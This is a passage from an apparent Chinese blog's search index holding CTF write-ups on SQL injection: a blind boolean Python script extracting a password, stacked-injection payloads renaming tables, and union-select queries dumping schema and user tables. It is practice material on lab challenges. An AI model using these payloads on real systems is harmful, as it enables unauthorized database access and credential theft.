class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;or(ascii(substr(username,1,1))&gt;100)#&#x27;</span><br></code></pre></td></tr></table></figure><p>此时的username就等于admin&#39; and password&#x3D;<br>这题貌似还可以用延时注入{我猜的}  但是没这个方便</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://3b7bdb9a-a1ed-4c2e-90a7-ff01c16448b4.node3.buuoj.cn/&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br> high = <span class="hljs-number">128</span><br> low = <span class="hljs-number">32</span><br> mid = (high + low) // <span class="hljs-number">2</span><br> <span class="hljs-keyword">while</span> low &lt; high:<br>     <span class="hljs-comment">#payload = &quot;or(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;)#&quot;.format(i, mid)</span><br>     payload = <span class="hljs-string">&quot;or(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br>     data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin\\&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: payload&#125;<br>     re = requests.post(url, data=data)<br>     <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stronger&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>         low = mid + <span class="hljs-number">1</span><br>     <span class="hljs-keyword">else</span>:<br>         high = mid<br>     mid = (high + low) // <span class="hljs-number">2</span><br> <span class="hljs-keyword">if</span> (low == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> high == <span class="hljs-number">128</span>):<br>     <span class="hljs-keyword">break</span><br> flag += <span class="hljs-built_in">chr</span>(mid)<br> <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯 2019 随便注 堆叠注入</title>
    <link href="/2022/03/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="强网杯-2019-随便注-堆叠注入"><a href="#强网杯-2019-随便注-堆叠注入" class="headerlink" title="[强网杯 2019]随便注 堆叠注入"></a>[强网杯 2019]随便注 堆叠注入</h3><p>11&#x2F;20&#x2F;2020 </p><p>多云  轻松</p><p>.——————————————————————-.</p><p>所谓堆叠注入，就是一次性执行多条查询语句</p><p>获取数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>看到了所有的数据库</p><p>查看数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>查看字段信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`; --+</span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(4) &quot;flag&quot;</span><br><span class="hljs-string">[1]=&gt;</span><br><span class="hljs-string">string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">[2]=&gt;</span><br><span class="hljs-string">string(2) &quot;NO&quot;</span><br><span class="hljs-string">[3]=&gt;</span><br><span class="hljs-string">string(0) &quot;&quot;</span><br><span class="hljs-string">[4]=&gt;</span><br><span class="hljs-string">NULL</span><br><span class="hljs-string">[5]=&gt;</span><br><span class="hljs-string">string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>原题目查询的数据表为words。既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为其他，再把1919810931114514改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p><p>payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">rename table `words` to `test`;</span><br><span class="hljs-string">rename table `1919810931114514` to `words`;</span><br><span class="hljs-string">alter table `words` change `flag` `id` varchar(100);</span><br><span class="hljs-string">show columns from words;--+</span><br><span class="hljs-string"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span><br></code></pre></td></tr></table></figure><p>使用 &#x2F;?inject&#x3D;1’ or 1&#x3D;’1 访问一下即可获得 flag</p><p>MySQL中反引号和单引号的区别与用法</p><p>MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>引号则用来标注语句中所引用的字符型常量或日期&#x2F;时间型常量，即字段值<br>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `username` <span class="hljs-keyword">where</span> `name`<span class="hljs-operator">=</span>&quot;peri0d&quot;<br></code></pre></td></tr></table></figure><p>ps:原来desc 可以查看数据表的结构！！！</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 LoveSQL</title>
    <link href="/2022/03/02/Dora/"/>
    <url>/2022/03/02/Dora/</url>
    
    <content type="html"><![CDATA[<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>使用万能密码 登陆</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 #</span><br></code></pre></td></tr></table></figure><p>登陆成功后发现password  然而并没有什么用</p><p>尝试密码md5解密失败，还是回到注入的思路上，查询字段数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; order by 4%23&amp;password=123</span><br><span class="hljs-string"></span><br><span class="hljs-string">//   %23是#</span><br></code></pre></td></tr></table></figure><p>得到字段数为3</p><p>爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,database(),version()%23&amp;password=123</span><br></code></pre></td></tr></table></figure><p>爆数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span><br></code></pre></td></tr></table></figure><p>发现两个表geekuser,l0ve1ysq1</p><p>猜测flag在l0ve1ysq1里</p><p>爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>l0ve1ysq1<span class="hljs-string">&#x27;%23&amp;password=123</span><br></code></pre></td></tr></table></figure><p>发现三个字段id,username,password</p><p>查看字段内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=123</span><br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
